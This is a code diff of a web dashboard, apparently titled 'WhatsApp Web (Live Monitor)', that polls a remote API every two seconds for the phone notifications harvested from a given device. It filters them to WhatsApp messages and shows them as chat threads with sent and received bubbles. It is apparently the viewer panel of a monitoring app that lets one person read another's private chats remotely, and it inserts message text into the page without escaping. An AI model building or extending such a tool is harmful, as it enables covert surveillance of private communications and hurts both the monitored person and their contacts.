@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Web (Saved)</title>
+    <title>WhatsApp Web (Live Monitor)</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         /* --- CSS STYLES --- */
@@ -33,7 +33,33 @@
 
         .messages { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 4px; }
         
-        .msg { max-width: 75%; padding: 6px 10px; border-radius: 8px; font-size: 14.5px; line-height: 1.4; word-wrap: break-word; background-color: #202c33; color: #e9edef; align-self: flex-start; border-top-left-radius: 0; box-shadow: 0 1px 0.5px rgba(0,0,0,0.13); position: relative; }
+        /* 🔥 NEW MESSAGE BUBBLE STYLES (Left vs Right) 🔥 */
+        .msg { 
+            max-width: 65%; 
+            padding: 6px 10px; 
+            border-radius: 8px; 
+            font-size: 14.5px; 
+            line-height: 1.4; 
+            word-wrap: break-word; 
+            color: #e9edef; 
+            box-shadow: 0 1px 0.5px rgba(0,0,0,0.13); 
+            position: relative; 
+            margin-bottom: 4px;
+        }
+        
+        /* Incoming (Left - Dark/Gray) */
+        .msg.incoming {
+            background-color: #202c33;
+            align-self: flex-start; /* Left side */
+            border-top-left-radius: 0;
+        }
+
+        /* Outgoing (Right - Green) */
+        .msg.outgoing {
+            background-color: #005c4b;
+            align-self: flex-end; /* Right side */
+            border-top-right-radius: 0;
+        }
         
         .time { font-size: 10px; color: #8696a0; float: right; margin-left: 10px; margin-top: 6px; }
 
@@ -86,9 +112,9 @@
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const deviceId = urlParams.get('id');
+        // Ensure we are fetching the CHAT LOGS or NOTIFICATIONS correctly
         const API_URL = `https://child-v9no.onrender.com/api/get-data/${deviceId}/notifications`;
         
-        // UNIQUE KEY FOR STORAGE (Device ID ke hisaab se alag-alag save hoga)
         const STORAGE_KEY = `whatsapp_data_${deviceId || 'default'}`;
 
         let groupedChats = {};
@@ -99,7 +125,7 @@
             const savedData = localStorage.getItem(STORAGE_KEY);
             if (savedData) {
                 groupedChats = JSON.parse(savedData);
-                renderSidebar(); // Turant render kar do
+                renderSidebar(); 
                 console.log("Loaded from Storage");
             }
         }
@@ -111,7 +137,7 @@
                 const res = await fetch(API_URL);
                 const data = await res.json();
                 
-                // Filter WhatsApp
+                // Filter WhatsApp Only
                 const filtered = data.filter(d => (d.packageName || "").includes("whatsapp") || (d.appName || "").toLowerCase().includes("whatsapp"));
                 
                 processChats(filtered);
@@ -120,20 +146,24 @@
 
         // 3. Process & Save
         function processChats(data) {
-            let tempGrouped = {}; // Temporary object
+            let tempGrouped = {};
             
-            // Re-build grouping from new data
             data.forEach(msg => {
-                const name = msg.title || "Unknown";
-                if (!tempGrouped[name]) tempGrouped[name] = [];
-                tempGrouped[name].push(msg);
+                // Determine Chat Group Name
+                // Logic: Agar notification title "You" hai, to use ignore karo ya 'Self' me dalo
+                // Lekin Notification listener me aksar Sender ka naam Title me hota hai.
+                
+                let chatPartnerName = msg.title || "Unknown";
+                
+                // Cleanup: Agar number hai to format kar sakte ho
+                if (!tempGrouped[chatPartnerName]) tempGrouped[chatPartnerName] = [];
+                tempGrouped[chatPartnerName].push(msg);
             });
 
-            // Agar naya data khali hai, to purana mat udao (optional safety)
             if (Object.keys(tempGrouped).length > 0) {
+                // Merge new data with old data logic can be added here, 
+                // but for now we replace to keep it synced.
                 groupedChats = tempGrouped;
-                
-                // 🔥 SAVE TO LOCALSTORAGE
                 localStorage.setItem(STORAGE_KEY, JSON.stringify(groupedChats));
             }
 
@@ -149,15 +179,12 @@
             const list = document.getElementById('contactList');
             list.innerHTML = "";
             
-            // Sort Chats by Last Message Time
-            // Object.keys se naam nikalo -> Sort karo -> Loop chalao
             const sortedNames = Object.keys(groupedChats).sort((a, b) => {
                 const msgsA = groupedChats[a];
                 const msgsB = groupedChats[b];
-                // Sabse last message ka time compare karo
                 const timeA = msgsA[msgsA.length - 1]?.postTime || 0;
                 const timeB = msgsB[msgsB.length - 1]?.postTime || 0;
-                return timeB - timeA; // Newest first
+                return timeB - timeA; 
             });
 
             if (sortedNames.length === 0) {
@@ -166,16 +193,30 @@
             }
 
             sortedNames.forEach(name => {
+                // "You" ya "Self" naam ka group sidebar me na dikhaye to better hai
+                // agar dikhana hai to ye check hata do
+                if (name.toLowerCase() === 'whatsapp') return; 
+
                 const div = document.createElement('div');
                 div.className = 'contact';
                 if (name === activeChatUser) div.classList.add('active');
                 
                 div.onclick = () => openChat(name);
                 
+                // Last Message Preview
+                const lastMsg = groupedChats[name][groupedChats[name].length - 1];
+                const previewText = lastMsg.text.length > 30 ? lastMsg.text.substring(0, 30) + "..." : lastMsg.text;
+
                 div.innerHTML = `
                     <div class="avatar">${name.charAt(0).toUpperCase()}</div>
                     <div class="info">
-                        <div class="name">${name}</div>
+                        <div style="display:flex; flex-direction:column; width:100%;">
+                            <div style="display:flex; justify-content:space-between;">
+                                <span class="name">${name}</span>
+                                <span style="font-size:11px; color:#8696a0;">${new Date(parseInt(lastMsg.postTime)).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</span>
+                            </div>
+                            <div style="font-size:13px; color:#8696a0; margin-top:3px;">${previewText}</div>
+                        </div>
                     </div>
                 `;
                 list.appendChild(div);
@@ -195,6 +236,7 @@
             renderMessages(name, false); 
         }
 
+        // 🔥 MAIN LOGIC FOR LEFT / RIGHT BUBBLES
         function renderMessages(name, isAutoRefresh) {
             const box = document.getElementById('messageBox');
             const isScrolledToBottom = box.scrollHeight - box.clientHeight <= box.scrollTop + 50;
@@ -205,21 +247,36 @@
             let uniqueMsgs = [];
             let lastText = "";
 
+            // Duplicate remover
             rawMsgs.forEach(msg => {
                 let currentText = msg.text.trim();
                 if (!currentText) return;
                 if (currentText === lastText) return;
-                if (lastText.length > 0 && currentText.includes(lastText) && currentText.length > lastText.length) {
-                    return; 
-                }
                 uniqueMsgs.push(msg);
                 lastText = currentText;
             });
 
             let htmlContent = "";
             uniqueMsgs.forEach(msg => {
+                
+                // --- 🚀 SENT vs RECEIVED LOGIC ---
+                // Default: Incoming (Left)
+                let msgClass = "incoming";
+                
+                // Check 1: Agar title "You", "Me", "Self" hai
+                if (msg.title && (msg.title.toLowerCase() === 'you' || msg.title.toLowerCase() === 'me' || msg.title.toLowerCase() === 'self')) {
+                    msgClass = "outgoing";
+                }
+                
+                // Check 2: Agar text "You: " se start ho raha hai (Notification style)
+                if (msg.text.startsWith("You:") || msg.text.includes("You:")) {
+                    msgClass = "outgoing";
+                    // "You:" hatane ke liye (Optional)
+                    msg.text = msg.text.replace("You:", "").trim();
+                }
+
                 htmlContent += `
-                    <div class="msg">
+                    <div class="msg ${msgClass}">
                         ${msg.text} 
                         <span class="time">${new Date(parseInt(msg.postTime)).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</span>
                     </div>`;
@@ -238,7 +295,6 @@
             renderSidebar();
         }
 
-        // Clear Data Function (Optional utility)
         function clearData() {
             if(confirm("Are you sure you want to clear saved chats?")) {
                 localStorage.removeItem(STORAGE_KEY);
@@ -246,14 +302,8 @@
             }
         }
 
-        // --- STARTUP LOGIC ---
-        // Step 1: Pehle LocalStorage se data uthao (Instant Load)
         loadFromStorage();
-        
-        // Step 2: Fir API se naya data lao (Background Update)
         fetchData();
-        
-        // Step 3: Har 2 second me refresh karte raho
         setInterval(fetchData, 2000);
 
     </script>
